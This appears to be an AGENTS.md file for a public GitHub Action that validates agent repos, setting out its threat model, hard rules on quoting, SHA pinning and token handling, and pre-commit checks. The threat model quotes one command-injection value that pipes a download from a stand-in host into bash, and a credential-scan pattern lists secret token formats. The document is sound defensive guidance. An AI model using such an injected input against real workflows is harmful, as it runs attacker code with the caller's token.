# AGENTS.md — validate-agent-action

A composite GitHub Action used by other repos in `jackin-project` to validate agent repos and build their Docker images multi-platform. **This repo is public**, and every call to this action from any consumer workflow executes the shell scripts here with inputs the caller provides.

Treat every commit as a change to code that runs inside someone else's CI with `GITHUB_TOKEN` scope.

## Threat model

1. **Workflow injection via inputs.** `action.yml` inputs (`path`, `jackin-version`, `build-platforms`) flow into bash scripts. Unquoted or naively-interpolated use creates command-injection vectors — e.g., a malicious consumer repo with `jackin-version: "0.5.0; curl evil.sh | bash"` if we ever stop quoting. Existing code quotes every interpolation; breaking that is the fastest regression path.
2. **Un-pinned action refs.** `action.yml` pins `docker/setup-qemu-action` and `docker/setup-buildx-action` by full 40-char SHA. Any new dependency must be pinned the same way — tags (`@v3`) are mutable, SHAs are not.
3. **`GITHUB_TOKEN` blast radius.** `GH_TOKEN: ${{ github.token }}` is exported into the downloader script. Default token scope includes read/write on the calling repo and read on other org repos. A script bug that posts/uploads somewhere unexpected leaks this token's power to anyone who can read those destinations.
4. **Cross-repo artifact trust.** `download-validator.sh` fetches validator builds from `jackin-project/jackin`'s CI artifacts (latest-build mode) or signed release archives (tagged mode). Whoever controls `jackin-project/jackin/.github/workflows/ci.yml` serves the binary that ends up in every consumer agent's CI. Ruleset protection on `jackin` is the anchor; validate it periodically.
5. **Docker build context.** `build-image.sh` runs `docker buildx build` on `${REPO_PATH}`. Path is caller-provided but scoped to the checked-out repo, so the threat is a malicious *agent* repo shipping a malicious Dockerfile — which is the system under test, not a lateral risk here.

## Hard rules (do not break these)

1. **Every user-controlled input must be quoted in shell.** `"$JACKIN_VERSION"`, `"$AGENT_PATH"`, etc. — never bare. Audit any `.sh` change for this.
2. **Every third-party action ref must be a 40-char SHA**, with the semver as a trailing comment (`# v3.2.0`). Never `@main`, `@v3`, or a tag-only ref.
3. **Tagged release downloads must verify `sha256`.** The checksum file from the release is the only tamper check. Latest-build mode falls back to GitHub's artifact integrity; document that clearly so consumers know the weaker guarantee.
4. **Never log or echo `$GH_TOKEN`.** `set -x` is banned in these scripts.
5. **Never introduce `set -o pipefail` + `| head -n1`** (see PR #2 for why — the SIGPIPE trap flakes CI nondeterministically).

## Required pre-commit checks

```bash
# 1. What's staged? Anything surprising?
git status --porcelain

# 2. Shell scripts: syntax + shellcheck if available
for f in $(git diff --cached --name-only -- '*.sh'); do
  bash -n "$f" || { echo "SYNTAX FAIL: $f"; exit 1; }
  command -v shellcheck >/dev/null && shellcheck "$f"
done

# 3. action.yml sanity: every `uses:` line must carry a 40-char SHA
if git diff --cached --name-only -- action.yml | grep -q .; then
  grep -E '^\s+uses:' action.yml | grep -Ev '@[0-9a-f]{40}' \
    && { echo "UN-PINNED ACTION IN action.yml"; exit 1; } || true
fi

# 4. Credential scan (defense-in-depth)
git diff --cached --name-only -z | xargs -0 -r \
  grep -l -iE "ghp_|gho_|ghs_|ghr_|github_pat_|BEGIN [A-Z ]*PRIVATE KEY|aws_access_key_id|aws_secret_access_key|bearer [a-z0-9-]{20,}" 2>/dev/null
```

## Upstream dependencies

This action depends on `jackin-project/jackin` serving well-formed validator artifacts. If that repo's CI or releases are compromised, consumers of this action inherit the compromise.

Verify periodically:
```bash
gh api repos/jackin-project/jackin/rulesets --jq '.[] | {name, target, enforcement}'
```

Expect at least one `branch` ruleset with `enforcement: active` on `~DEFAULT_BRANCH`.

## Conventions

- Branch naming: `chore/*`, `feat/*`, `fix/*`
- Commit messages follow Conventional Commits
- `main` is the primary branch
- All changes go through PR

## What this does NOT protect against

- A malicious caller workflow passing crafted inputs to `action.yml` — we quote defensively, but a new input added without quoting is an injection risk. Review every new input carefully.
- A compromised `docker/setup-qemu-action` or `docker/setup-buildx-action` upstream — SHA pinning pins to a *specific* version; if we update the SHA, we inherit whatever is at the new SHA. Vet the diff before bumping.
- A compromised `jackin-project/jackin` CI pipeline — addressed in that repo, not here.
